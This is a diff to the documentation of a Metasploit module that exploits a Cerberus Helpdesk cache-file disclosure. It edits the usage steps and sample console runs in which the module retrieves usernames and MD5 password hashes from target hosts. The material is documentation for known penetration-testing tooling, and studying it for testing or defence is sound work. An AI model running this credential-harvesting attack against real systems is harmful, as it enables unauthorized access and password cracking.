@@ -20,10 +20,10 @@ Version 5.4.4 is available on [exploit-db.com](https://www.exploit-db.com/apps/8
 
 1. Start msfconsole
 2. ```use auxiliary/gather/cerberus_helpdesk_hash_disclosure```
-3. ```set rhosts```
+3. ```set rhosts [rhosts]```
 4. ```run```
 
-## Demo
+## Scenarios
 
 ### 4.2.3 using zend (not verbose)
 
@@ -33,29 +33,50 @@ Version 5.4.4 is available on [exploit-db.com](https://www.exploit-db.com/apps/8
     rhosts => 1.1.1.1
     msf auxiliary(cerberus_helpdesk_hash_disclosure) > run
     
-    [-] Invalid response received for /storage/tmp/devblocks_cache---ch_workers
-    [+] admin:aaa34a6111abf0bd1b1c4d7cd7ebb37b
-    [+] example:112302c209fe8d73f502c132a3da2b1c
-    [+] foobar:0d108d09e5bbe40aade3de5c81e9e9c7
+    [-] Invalid response received for 1.1.1.1    for /storage/tmp/devblocks_cache---ch_workers
+    [+] Found: admin:aaa34a6111abf0bd1b1c4d7cd7ebb37b
+    [+] Found: example:112302c209fe8d73f502c132a3da2b1c
+    [+] Found: foobar:0d108d09e5bbe40aade3de5c81e9e9c7
+    
+    Cerberus Helpdesk User Credentials
+    ==================================
+    
+     Username                     Password Hash
+     --------                     -------------
+     admin                        aaa34a6111abf0bd1b1c4d7cd7ebb37b
+     example                      112302c209fe8d73f502c132a3da2b1c
+     foobar                       0d108d09e5bbe40aade3de5c81e9e9c7
+    
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
   ```
 
 ### 5.4.4 using devblocks
 
   ```
     msf > use auxiliary/gather/cerberus_helpdesk_hash_disclosure 
-    rhost => 192.168.2.45
     msf auxiliary(cerberus_helpdesk_hash_disclosure) > set rhosts 192.168.2.45
     rhosts => 192.168.2.45
-    msf auxiliary(cerberus_helpdesk_hash_disclosure) > set uri /cerb5/
-    uri => /cerb5/
+    msf auxiliary(cerberus_helpdesk_hash_disclosure) > set targeturi /cerb5/
+    targeturi => /cerb5/
     msf auxiliary(cerberus_helpdesk_hash_disclosure) > set verbose true
     verbose => true
     msf auxiliary(cerberus_helpdesk_hash_disclosure) > run
     
     [*] Attempting to load data from /cerb5/storage/tmp/devblocks_cache---ch_workers
-    [+] bar@none.com:37b51d194a7513e45b56f6524f2d51f2
-    [+] foo@none.com:acbd18db4cc2f85cedef654fccc4a4d8
-    [+] admin@example.com:18126e7bd3f84b3f3e4df094def5b7de
+    [+] Found: bar@none.com:37b51d194a7513e45b56f6524f2d51f2
+    [+] Found: foo@none.com:acbd18db4cc2f85cedef654fccc4a4d8
+    [+] Found: mike@shorebreaksecurity.com:18126e7bd3f84b3f3e4df094def5b7de
+    
+    Cerberus Helpdesk User Credentials
+    ==================================
+    
+     Username                     Password Hash
+     --------                     -------------
+     bar@none.com                 37b51d194a7513e45b56f6524f2d51f2
+     foo@none.com                 acbd18db4cc2f85cedef654fccc4a4d8
+     admin@example.com            18126e7bd3f84b3f3e4df094def5b7de
+    
     [*] Scanned 1 of 1 hosts (100% complete)
     [*] Auxiliary module execution completed
   ```
